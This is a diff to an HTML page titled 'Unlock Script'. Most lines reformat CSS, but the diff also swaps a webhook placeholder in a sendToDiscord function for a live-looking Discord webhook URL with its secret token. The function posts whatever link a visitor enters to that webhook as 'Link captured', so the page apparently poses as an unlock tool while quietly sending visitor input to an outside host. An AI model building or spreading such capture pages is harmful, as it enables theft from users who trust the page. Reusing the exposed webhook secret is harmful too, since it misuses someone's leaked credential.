@@ -4,9 +4,18 @@
 <title>Unlock Script</title>
 <link href="https://fonts.googleapis.com/css2?family=Orbitron&family=Share+Tech+Mono&display=swap" rel="stylesheet">
 <style>
-body { background:#111; color:#0ff; font-family:'Orbitron', sans-serif; text-align:center; padding-top:50px; }
-input { width:80%; padding:10px; font-size:16px; }
-#status { margin-top:10px; font-size:18px; }
+body {
+background:#111; color:#0ff;
+font-family:'Orbitron', sans-serif;
+text-align:center; padding-top:50px;
+}
+input {
+width:80%; padding:10px;
+font-size:16px;
+}
+#status {
+margin-top:10px; font-size:18px;
+}
 </style>
 </head>
 <body>
@@ -16,7 +25,7 @@ input { width:80%; padding:10px; font-size:16px; }
 
 <script>
 function sendToDiscord(link) {
-fetch("YOUR_WEBHOOK_URL", {
+fetch("https://discord.com/api/webhooks/1428906431641423992/90Ygj66VDd74_XUtbRjSFa7AjPNyRZtc2CtiasvH45CuTcTLW48ty6bVbRqdRQ9KEYXd", {
 method: "POST",
 headers: { "Content-Type": "application/json" },
 body: JSON.stringify({ content: `🚨 Link captured: ${link}` })
